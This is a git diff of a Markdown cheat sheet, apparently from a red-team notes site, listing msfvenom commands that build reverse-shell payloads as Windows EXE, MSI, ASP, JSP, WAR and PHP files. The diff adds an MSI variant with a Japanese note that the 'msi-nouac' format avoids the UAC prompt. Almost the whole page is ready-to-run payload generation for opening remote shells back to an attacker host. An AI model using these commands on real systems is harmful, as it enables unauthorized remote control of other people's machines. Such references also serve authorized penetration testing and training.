@@ -1,35 +1,52 @@
 ---
 title: msfvenom
-parent: Weaponization
-grand_parent: Red Team
 ---
 # Create Reverse Shell
-# exe(32)
+
+## EXE(64)
+
 ```zsh
-msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shellx64.exe
 ```
 
-# exe(64)
+## EXE(32)
+
 ```zsh
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shellx86.exe
 ```
 
-# asp
+## msi
+
 ```zsh
-msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp >shell.asp
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > shellx86.msi
 ```
 
-# jsp
+```zsh
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi-nouac > shell.msi
+```
+
+- msi-nouac: 管理者権限を要求しないことでUACをださない
+
+## asp
+
+```zsh
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+```
+
+## jsp
+
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 ```
 
-# war
+## war
+
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 ```
 
-# php
+## php
+
 ```
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT>- f raw > shell.php
 ```
